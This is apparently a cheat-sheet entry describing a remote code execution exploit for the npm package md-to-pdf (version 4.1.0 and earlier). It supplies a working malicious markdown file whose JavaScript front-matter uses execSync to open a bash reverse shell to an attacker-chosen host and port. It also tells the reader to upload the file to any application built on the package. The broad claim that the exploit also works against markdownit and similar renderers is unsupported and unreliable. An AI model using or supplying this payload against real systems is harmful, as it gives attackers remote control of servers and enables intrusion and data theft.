# md-to-pdf JavaScript RCE

`md-to-pdf` ≤4.1.0 (npm) processes front-matter as JavaScript. Inject a `require('child_process')` call in the YAML front-matter of an uploaded markdown file to get RCE.

```yaml
---js
{
  css: `body{}`,
  pdf_options: { format: 'A4' },
  stylesheet_encoding: 'utf-8'
}
const {execSync} = require('child_process');
execSync('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"');
---
# Normal markdown content
```

Upload or send as markdown input to any app that calls `md-to-pdf`. Works against `markdownit`, `md-to-pdf`, and similar node markdown rendering pipelines that evaluate front-matter.
